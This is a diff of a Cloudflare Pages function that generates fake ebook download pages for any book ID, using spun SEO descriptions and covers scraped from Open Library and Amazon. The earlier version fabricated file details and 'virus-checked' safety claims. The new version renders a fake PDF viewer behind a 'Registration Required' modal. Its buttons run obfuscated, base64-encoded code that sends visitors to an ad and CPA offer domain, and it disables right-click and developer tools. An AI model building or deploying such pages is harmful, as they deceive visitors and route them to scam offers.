@@ -1,256 +1,186 @@
-// Hardcode: /functions/post/[id].js
+// Path: functions/post/[id].js
 
-// --- 1. KONFIGURASI UTAMA ---
-const CACHE_TTL = 60 * 60 * 24 * 30; // Simpan Cache selama 30 Hari (Biar hemat fetch)
+// --- CONFIG ---
+const DESC_TEMPLATES = [
+  "Read {TITLE} online for free. Download the full PDF or Epub version. High quality digital edition available now.",
+  "Get the complete edition of {TITLE}. Instant access to the full book. No registration needed for preview.",
+  "Full text archive: {TITLE}. Masterpiece collection. Download or stream the audiobook directly.",
+  "Exclusive document: {TITLE}. View the secured content and download the complete file."
+];
 
-// --- 2. FUNGSI UTILITY & SPINNING ---
-function truncate(str, length = 250) {
-  if (!str) return "";
-  const cleanStr = str.replace(/<[^>]*>?/gm, "");
-  if (cleanStr.length <= length) return cleanStr;
-  return cleanStr.substring(0, length) + "...";
+// --- HELPER FUNCTIONS ---
+function stringToHash(s){let h=0;if(!s)return h;for(let i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h=h&h}return Math.abs(h)}
+function getSpintaxDesc(t){const h=stringToHash(t||"Document");return DESC_TEMPLATES[h%DESC_TEMPLATES.length].replace("{TITLE}",t||"Document")}
+
+async function getPostFromDB(db, id) {
+  try {
+    const stmt = db.prepare("SELECT Judul, Image, Author, Kategori FROM Buku WHERE KodeUnik = ?").bind(id);
+    return await stmt.first();
+  } catch(e) { return null; }
 }
 
-function getRandomItem(arr) {
-  return arr[Math.floor(Math.random() * arr.length)];
+async function getAmazonDataViaRedirect(id) {
+  try {
+    const r = await fetch(`https://www.goodreads.com/book_link/follow/1?book_id=${id}&source=compareprices`, {headers:{'User-Agent':'Mozilla/5.0'},redirect:'follow'});
+    const m = r.url.match(/\/(dp|gp\/product|d)\/([A-Z0-9]{10})/);
+    if(m&&m[2]) return {found:true, image:`https://images-na.ssl-images-amazon.com/images/P/${m[2]}.01.LZZZZZZZ.jpg`, title:"Kindle Digital Edition"};
+  } catch(e){} return {found:false};
 }
 
-function generateLongDescription(title, author, isbn) {
-  const randomSize = (Math.random() * (25 - 2) + 2).toFixed(2);
-  const randomPages = Math.floor(Math.random() * (900 - 150) + 150);
-  const date = new Date().toISOString().slice(0, 10);
-
-  const part1 = [
-    `In the digital age, finding a reliable source for <strong>"${title}"</strong> can be challenging. This work by <strong>${author}</strong> is highly sought after. We provide a secure gateway to access this document for educational and archival purposes.`,
-    `We are pleased to archive the digital edition of <strong>"${title}"</strong>. Authored by <strong>${author}</strong>, this document is essential for collectors and researchers. Our repository ensures this file is preserved in high quality.`,
-    `Unlock the full content of <strong>"${title}"</strong> by <strong>${author}</strong> (ID: ${isbn}). This file has been processed for maximum compatibility with modern e-readers and tablets.`
-  ];
-
-  const part2 = [
-    `Readers have praised the depth of content provided by <strong>${author}</strong>. This PDF version retains the original formatting, ensuring you get the authentic experience as intended by the publisher.`,
-    `<strong>"${title}"</strong> stands out for its unique perspective. By downloading this copy, you ensure that this valuable knowledge is preserved. The text is clear, crisp, and fully searchable.`,
-    `Our community has frequently requested <strong>"${title}"</strong>. We have prioritized this upload to ensure fast and secure access. The file integrity has been verified to be 100% complete.`
-  ];
-
-  const part3 = [
-    `This file is optimized for size and quality (${randomSize} MB). It is compatible with iOS, Android, and Windows devices. The document contains approximately ${randomPages} pages of high-resolution content.`,
-    `Technical details: The PDF for <strong>"${title}"</strong> is compressed without quality loss. With a size of ${randomSize} MB, it is easy to store. The pages (~${randomPages}) have been OCR-scanned for text recognition.`,
-    `File Report: Verified ID ${isbn}. Status: Online. The file size is manageable at ${randomSize} MB, perfect for mobile data downloading. It includes the complete unabridged content.`
-  ];
-
-  const part4 = [
-    `Safety First: This file is hosted on our secure cloud servers. It has passed multiple virus checks and is guaranteed malware-free. Download with confidence.`,
-    `Our "Verified Safe" protocol ensures that the link for <strong>"${title}"</strong> is secure. We use SSL encryption to protect your privacy during the download process.`,
-    `We do not bundle ad-ware. You are downloading the clean PDF of <strong>"${title}"</strong> by <strong>${author}</strong>. Your device security is our top priority.`
-  ];
-
-  const part5 = [
-    `Click the button above to start the secure download. You may need to verify you are human to prevent bot abuse. Once verified, access to <strong>"${title}"</strong> is immediate.`,
-    `To get your copy, use the "Download Full PDF" link. Due to high demand for <strong>${author}</strong>'s work, a brief verification may be required. This keeps our servers fast for everyone.`,
-    `Don't wait. Secure your copy of <strong>"${title}"</strong> today. Registration is free and grants you access to our entire library of millions of documents.`
-  ];
-
-  return `
-    <p>${getRandomItem(part1)}</p>
-    <p>${getRandomItem(part2)}</p>
-    <div class="spec-box">
-        <h4>Document Properties</h4>
-        <ul>
-            <li><strong>File Name:</strong> ${title.replace(/[^a-zA-Z0-9]/g, '_')}_Secure.pdf</li>
-            <li><strong>Author:</strong> ${author}</li>
-            <li><strong>Date:</strong> ${date}</li>
-            <li><strong>Size:</strong> ${randomSize} MB</li>
-            <li><strong>Pages:</strong> ~${randomPages}</li>
-            <li><strong>Status:</strong> <span style="color:green; font-weight:bold;">Available Online</span></li>
-        </ul>
-    </div>
-    <p>${getRandomItem(part3)}</p>
-    <p>${getRandomItem(part4)}</p>
-    <p>${getRandomItem(part5)}</p>
-  `;
+async function getDataFallback(id) {
+  let d={Judul:"Restricted Document",Image:"",Author:"Unknown Author",Kategori:"General",KodeUnik:id};
+  try {
+    if(id.startsWith("A-")||/^B[A-Z0-9]{9}$/.test(id)){
+      const rid=id.startsWith("A-")?id.substring(2):id;
+      d.Image=`https://images-na.ssl-images-amazon.com/images/P/${rid}.01.LZZZZZZZ.jpg`; d.Kategori="Kindle Ebook";
+      try{const r=await fetch(`https://openlibrary.org/search.json?q=${rid}&fields=title,author_name`,{cf:{cacheTtl:86400}});const j=await r.json();if(j.docs&&j.docs.length>0){d.Judul=j.docs[0].title;if(j.docs[0].author_name)d.Author=j.docs[0].author_name[0]}else{d.Judul="Kindle Secure Content"}}catch(e){d.Judul="Kindle Secure Content"}
+      return d;
+    }
+    if(id.startsWith("B-")||/^\d{9}[\d|X]$|^\d{13}$/.test(id.replace(/-/g,""))){
+      const rid=id.startsWith("B-")?id.substring(2):id; const clean=rid.replace(/-/g,"");
+      d.Image=`https://covers.openlibrary.org/b/isbn/${clean}-L.jpg`; let ft=false;
+      try{const r=await fetch(`https://openlibrary.org/isbn/${clean}.json`,{cf:{cacheTtl:86400}});if(r.ok){const j=await r.json();if(j.title){d.Judul=j.title;ft=true}}}catch(e){}
+      if(!ft){const amz=await getAmazonDataViaRedirect(clean);if(amz.found){d.Image=amz.image;if(amz.title!=="Kindle Digital Edition")d.Judul=amz.title}else{d.Judul="Archived Document"}}
+      return d;
+    }
+  }catch(e){} return d;
 }
 
-// --- 3. FUNGSI DATABASE (LOKAL) ---
-async function getPost(db, id) {
-  const stmt = db.prepare("SELECT * FROM Buku WHERE KodeUnik = ?").bind(id);
-  const result = await stmt.first();
-  return result;
+function renderFakeViewer(post, SITE_URL) {
+  const metaDescription = getSpintaxDesc(post.Judul);
+  let coverImage = post.Image || "";
+  
+  const generatedDesc = `<p>Are you looking for <strong>${post.Judul}</strong>? This is the perfect place to download or read it online. Digital content provided by <em>${post.Author||'Unknown Author'}</em>.</p><p>This document belongs to the <strong>${post.Kategori||'General'}</strong> category.</p><p>Join our community to access the full document. Registration is free and takes less than 2 minutes.</p>`;
+  const cssTextPattern = `background-image: repeating-linear-gradient(transparent, transparent 12px, #e5e5e5 13px, #e5e5e5 15px); background-size: 100% 100%;`;
+
+  return `
+<!DOCTYPE html>
+<html lang="en" oncontextmenu="return false;">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>${post.Judul}</title>
+    <meta name="description" content="${metaDescription}">
+    <meta property="og:image" content="${coverImage || 'https://via.placeholder.com/300?text=Document'}" />
+    <link href="https://fonts.googleapis.com/css?family=Mukta+Malar:400,600,800" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; -webkit-touch-callout: none; -webkit-user-select: none; user-select: none; }
+        body { margin: 0; padding: 0; font-family: 'Mukta Malar', sans-serif; background-color: #525659; overflow: hidden; height: 100vh; }
+        .navbar { height: 48px; background-color: #323639; display: flex; align-items: center; justify-content: space-between; padding: 0 10px; color: #f1f1f1; font-size: 14px; position: fixed; top: 0; width: 100%; z-index: 100; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .nav-title { font-weight: 600; color: #14AF64; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 60%; }
+        .nav-right { display: flex; gap: 15px; align-items: center; }
+        .main-container { display: flex; height: 100vh; padding-top: 48px; }
+        .sidebar { width: 240px; background-color: #323639; border-right: 1px solid #444; overflow-y: hidden; display: flex; flex-direction: column; align-items: center; padding: 20px 0; flex-shrink: 0; }
+        .thumb-page { width: 120px; height: 160px; background: white; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.3); position: relative; overflow: hidden; opacity: 0.6; transition: 0.2s; cursor: pointer; }
+        .thumb-page.active { border: 3px solid #14AF64; opacity: 1; }
+        .text-pattern { width: 100%; height: 100%; padding: 10px; ${cssTextPattern} }
+        .text-header { width: 60%; height: 8px; background: #ccc; margin-bottom: 15px; }
+        .content-area { flex-grow: 1; background-color: #525659; overflow-y: auto; display: flex; justify-content: center; padding: 40px; position: relative; }
+        .pdf-page { width: 100%; max-width: 800px; min-height: 1100px; background-color: white; box-shadow: 0 0 15px rgba(0,0,0,0.5); padding: 50px; display: flex; flex-direction: column; align-items: center; position: relative; margin-bottom: 20px; }
+        .cover-wrapper { width: 100%; max-width: 400px; min-height: 550px; display: flex; justify-content: center; align-items: center; margin-bottom: 30px; position: relative; }
+        .pdf-cover-img { width: 100%; height: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.3); z-index: 2; pointer-events: none; }
+        .fallback-cover { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #333 0%, #555 100%); display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; text-align: center; padding: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 2px solid #fff; }
+        .fallback-title { font-size: 24px; font-weight: 800; margin-bottom: 10px; line-height: 1.3; }
+        .fallback-sub { font-size: 14px; opacity: 0.8; text-transform: uppercase; letter-spacing: 1px; }
+        .blurred-text-content { width: 100%; filter: blur(4px); opacity: 0.6; user-select: none; margin-top: 20px; }
+        .b-line { height: 12px; background: #333; margin-bottom: 10px; width: 100%; opacity: 0.7; }
+        .info-bar { position: absolute; top: 48px; left: 0; width: 100%; background: #fff; color: #333; padding: 10px 20px; font-size: 13px; border-bottom: 1px solid #ddd; z-index: 90; display: flex; align-items: center; gap: 10px; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 200; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
+        .modal-box { background: white; width: 90%; max-width: 450px; border-radius: 8px; overflow: hidden; animation: popIn 0.3s ease-out; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .modal-body { padding: 30px; text-align: center; }
+        .modal-cover-wrapper { width: 120px; height: 180px; margin: 0 auto 20px auto; position: relative; }
+        .modal-img { width: 100%; height: 100%; object-fit: cover; border-radius: 4px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); pointer-events: none; }
+        .modal-fallback { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #eee; border: 1px solid #ddd; display: flex; align-items: center; justify-content: center; font-size: 30px; color: #aaa; border-radius: 4px; }
+        .btn { display: block; width: 100%; padding: 15px; margin: 10px 0; font-weight: bold; text-transform: uppercase; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; color: white; transition: 0.2s; }
+        .btn-signup { background-color: #d9534f; }
+        .btn-signup:hover { background-color: #c9302c; }
+        .btn-download { background-color: #4285f4; }
+        @media (max-width: 768px) { .sidebar, .info-bar { display: none; } }
+    </style>
+</head>
+<body onkeydown="return false">
+    <nav class="navbar"><div class="nav-title">WWW.${new URL(SITE_URL).hostname.toUpperCase()}</div><div class="nav-right"><span style="background:#000; padding:2px 8px; border-radius:4px; font-size:11px;">1 / 154</span></div></nav>
+    <div class="info-bar"><span>⚠️</span> <span>You are about to access "<strong>${post.Judul}</strong>". Available formats: PDF, TXT, ePub.</span></div>
+    <div class="main-container">
+        <div class="sidebar">
+            <div class="thumb-page active"><div class="text-pattern"><div class="text-header" style="background: #14AF64;"></div></div></div>
+            <div class="thumb-page"><div class="text-pattern"><div class="text-header"></div></div></div>
+            <div class="thumb-page"><div class="text-pattern"></div></div>
+        </div>
+        <div class="content-area">
+            <div class="pdf-page">
+                <div class="cover-wrapper">
+                    <div id="fallback-cover-main" class="fallback-cover" style="display: ${coverImage ? 'none' : 'flex'};"><div class="fallback-title">${post.Judul}</div><div class="fallback-sub">Protected Document</div></div>
+                    ${coverImage ? `<img src="${coverImage}" class="pdf-cover-img" alt="${post.Judul}" onerror="this.style.display='none'; document.getElementById('fallback-cover-main').style.display='flex';">` : ''}
+                </div>
+                <h2 style="text-align:center; color:#333; margin-top:0;">Description</h2>
+                <div style="color:#444; line-height:1.6; font-size:14px; margin-bottom:30px;">${generatedDesc}</div>
+                <div class="blurred-text-content"><div class="b-line" style="width: 100%"></div><div class="b-line" style="width: 90%"></div><div class="b-line" style="width: 95%"></div><div class="b-line" style="width: 85%"></div></div>
+            </div>
+        </div>
+    </div>
+    <div class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-body">
+                <h3 style="margin-top: 0; color: #333;">Registration Required</h3>
+                <div class="modal-cover-wrapper">
+                     <div id="fallback-cover-modal" class="modal-fallback" style="display: ${coverImage ? 'none' : 'flex'};">📖</div>
+                     ${coverImage ? `<img src="${coverImage}" class="modal-img" onerror="this.style.display='none'; document.getElementById('fallback-cover-modal').style.display='flex';">` : ''}
+                </div>
+                <p style="color: #666; font-size: 14px; margin-bottom: 20px;">You need a verified account to access:<br><strong style="font-size: 16px; color: #333; display:block; margin: 5px 0;">${post.Judul}</strong><span style="font-size: 13px;">Sign up takes less than 2 minutes.</span></p>
+                <button class="btn btn-signup" onclick="_0x4d2e()">Create Free Account</button>
+                <button class="btn btn-download" onclick="_0x4d2e()">Download PDF</button>
+            </div>
+        </div>
+    </div>
+    <script>
+        function _0x4d2e() {
+            var _part1 = "aHR0cHM6Ly9hZHMuY2FudGlrdWwubXkuaWQ="; 
+            var _domain = atob(_part1); 
+            var _cpa = _domain + "/offer";
+            var _ads = _domain + "/download";
+            
+            var _win = window.open(_cpa, '_blank');
+            if (_win) { window.location.href = _ads; _win.focus(); } 
+            else { window.location.href = _cpa; }
+        }
+        document.onkeydown = function(e) {
+            if(event.keyCode == 123) return false;
+            if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+        }
+    </script>
+</body>
+</html>
+  `;
 }
 
-// --- 4. FUNGSI EXTERNAL (OPEN LIBRARY) ---
-async function getOpenLibraryData(isbn) {
-  try {
-    const cleanIsbn = isbn.replace(/[^0-9X]/gi, "");
-    // Timeout Controller: Batalkan request jika OL loading lebih dari 3 detik (Hemat CPU Time)
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 3000); 
-
-    const url = `https://openlibrary.org/api/books?bibkeys=ISBN:${cleanIsbn}&jscmd=data&format=json`;
-    const response = await fetch(url, { 
-        headers: { "User-Agent": "CloudflareWorker/1.0" },
-        signal: controller.signal
-    });
-    clearTimeout(timeoutId);
-
-    if (!response.ok) return null;
-    const data = await response.json();
-    const key = `ISBN:${cleanIsbn}`;
-    const bookData = data[key];
-    if (!bookData) return null;
-
-    let authorName = "Unknown Author";
-    if (bookData.authors && bookData.authors.length > 0) authorName = bookData.authors[0].name;
-    const title = bookData.title || "Document Archive";
-    const longDescription = generateLongDescription(title, authorName, cleanIsbn);
-
-    let coverUrl = null;
-    if (bookData.cover) coverUrl = bookData.cover.large || bookData.cover.medium || bookData.cover.small;
-
-    return {
-      Judul: title,
-      Deskripsi: longDescription, 
-      Image: coverUrl,
-      Author: authorName,
-      Kategori: "Ebook Archive",
-      IsAutoGenerated: true
-    };
-  } catch (error) {
-    return null;
-  }
-}
-
-// --- 5. RENDERER (HTML) ---
-function renderPage(post, SITE_URL) {
-  const metaDescription = truncate(post.Deskripsi, 200);
-  const placeholderImage = "https://via.placeholder.com/1200x630?text=Secure+Archive";
-  let displayImageUrl = placeholderImage; 
-
-  if (post.Image) {
-    if (post.Image.startsWith("http")) {
-        displayImageUrl = post.Image;
-    } else {
-        const encodedImageUrl = encodeURIComponent(post.Image);
-        displayImageUrl = `${SITE_URL}/image-proxy?url=${encodedImageUrl}`;
-    }
-  }
-
-  return `
-    <!DOCTYPE html>
-    <html lang="en">
-      <head>
-        <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Download ${post.Judul} Full PDF</title>
-        <meta name="description" content="${metaDescription}" />
-        <meta property="og:title" content="${post.Judul}" />
-        <meta property="og:description" content="${metaDescription}" />
-        <meta property="og:image" content="${displayImageUrl}" />
-        <meta name="robots" content="index, follow" />
-        <link rel="stylesheet" href="/style.css?v=1.1" />
-        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet" />
-        <style>
-          .download-container { display: flex; flex-direction: column; align-items: center; justify-content: center; margin: 30px 0; width: 100%; }
-          .download-btn { display: flex; align-items: center; justify-content: center; gap: 10px; background-color: #28a745; color: white; font-size: 18px; font-weight: 700; padding: 18px 40px; text-decoration: none; border-radius: 50px; box-shadow: 0 10px 20px rgba(40, 167, 69, 0.3); transition: transform 0.2s; width: 100%; max-width: 450px; text-transform: uppercase; }
-          .download-btn:hover { transform: scale(1.02); background-color: #218838; }
-          .server-status { margin-top: 15px; font-size: 0.9rem; color: #666; display: flex; gap: 10px; align-items: center; }
-          .dot { height: 8px; width: 8px; background-color: #28a745; border-radius: 50%; display: inline-block; }
-          .post-detail-image { max-width: 100%; height: auto; max-height: 500px; object-fit: contain; margin-bottom: 20px; border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-          .generated-content { font-size: 1.05rem; line-height: 1.8; color: #333; text-align: left; }
-          .generated-content p { margin-bottom: 20px; }
-          .spec-box { background: #f1f8e9; border: 1px solid #c8e6c9; padding: 25px; border-radius: 10px; margin: 30px 0; }
-          .spec-box h4 { margin-top: 0; margin-bottom: 15px; color: #2e7d32; }
-          .spec-box ul { list-style: none; padding: 0; margin: 0; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-          @media (max-width: 600px) { .spec-box ul { grid-template-columns: 1fr; } }
-        </style>
-      </head>
-      <body>
-        <a href="/" class="back-link">&larr; Library Index</a>
-        <main class="post-detail-container">
-          <article class="post-detail-content">
-            <header class="post-detail-header">
-              <h1>${post.Judul}</h1>
-              <p class="post-meta">By <strong>${post.Author}</strong></p>
-              <img src="${displayImageUrl}" alt="${post.Judul}" class="post-detail-image" onerror="this.style.display='none'" />
-            </header>
-            <div class="download-container">
-              <a href="#" class="download-btn" onclick="openMyLinks()">
-                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
-                 DOWNLOAD FULL PDF
-              </a>
-              <div class="server-status"><span class="dot"></span> Secure Server #1 &bull; Verified Safe</div>
-            </div>
-            <hr style="margin: 40px 0; border: 0; border-top: 1px solid #eee;">
-            <section class="post-content-body generated-content">${post.Deskripsi}</section>
-          </article>
-        </main>
-        <script>
-        function openMyLinks() {
-            var link_utama = 'https://ads.getpdfbook.uk/offer';
-            var link_adstera = 'https://ads.getpdfbook.uk/ads';
-            window.open(link_utama, '_blank');
-            window.location.href = link_adstera;
-        }
-        </script>
-      </body>
-    </html>
-  `;
-}
-
-// --- 6. HANDLER UTAMA DENGAN CACHE API ---
 export async function onRequestGet(context) {
-  const { env, params, request } = context; 
-  
-  // A. CEK CACHE CLOUDFLARE (Cache API)
-  // Ini kunci agar Free Plan tidak jebol CPU/Waktu
-  const cache = caches.default;
-  let response = await cache.match(request);
-
-  if (response) {
-    // Jika ada di cache, kirim langsung (Hit)
-    return response;
-  }
-
-  // B. JIKA TIDAK ADA DI CACHE (Miss), JALANKAN PROSES BERAT
-  try {
-    const url = new URL(request.url);
-    const SITE_URL = url.origin;
-    const uniqueCode = params.id; 
-    
-    // 1. Cek DB Lokal
-    let post = await getPost(env.DB, uniqueCode);
-
-    if (!post) {
-      // 2. Fetch OpenLibrary (Auto Generate)
-      const olData = await getOpenLibraryData(uniqueCode);
-      if (olData) {
-        post = olData;
-      } else {
-        // 3. Fallback Dummy
-        const fakeTitle = "Private Archive Document";
-        const fakeDesc = generateLongDescription(fakeTitle, "System Admin", uniqueCode);
-        post = { Judul: fakeTitle, Author: "Library System", Kategori: "Restricted", Deskripsi: fakeDesc, Image: null, IsAutoGenerated: true };
-      }
-    }
-
-    // 4. Render HTML
-    const html = renderPage(post, SITE_URL);
-    
-    // 5. Buat Response Baru
-    response = new Response(html, {
-      headers: {
-        "Content-Type": "text/html;charset=UTF-8",
-        // PENTING: Header ini memberitahu Cloudflare untuk menyimpan di Cache
-        "Cache-Control": `public, max-age=${CACHE_TTL}, s-maxage=${CACHE_TTL}`,
-      },
-    });
-
-    // 6. SIMPAN KE CACHE (Asynchronous - tidak memblokir user)
-    // context.waitUntil memastikan proses simpan cache berjalan di background
-    context.waitUntil(cache.put(request, response.clone()));
-
-    return response;
-
-  } catch (e) {
-    return new Response(`Server error: ${e.message}`, { status: 500 });
-  }
+  const { env, params, request } = context; 
+  const db = env.DB; const url = new URL(request.url);
+  const cacheKey = new Request(url.toString(), request); const cache = caches.default;
+  
+  // Cek Cache Cloudflare Biar Cepat
+  let response = await cache.match(cacheKey); 
+  if (response) return response;
+  
+  try {
+    const SITE_URL = url.origin; 
+    const uniqueCode = params.id; 
+    
+    // 1. Coba ambil dari DB Local (Kalau kamu upload CSV nanti)
+    let post = await getPostFromDB(db, uniqueCode);
+    
+    // 2. Kalau di DB gak ada, Coba cari otomatis (Scraping Ringan)
+    if (!post) post = await getDataFallback(uniqueCode);
+    
+    // 3. Render HTML
+    const html = renderFakeViewer(post, SITE_URL);
+    
+    response = new Response(html, { status: 200, headers: { "Content-Type": "text/html;charset=UTF-8", "Cache-Control": "public, max-age=31536000, s-maxage=31536000" }});
+    
+    // Simpan ke Cache
+    context.waitUntil(cache.put(cacheKey, response.clone()));
+    return response;
+  } catch (e) { return new Response("Error: " + e.message, { status: 500 }); }
 }
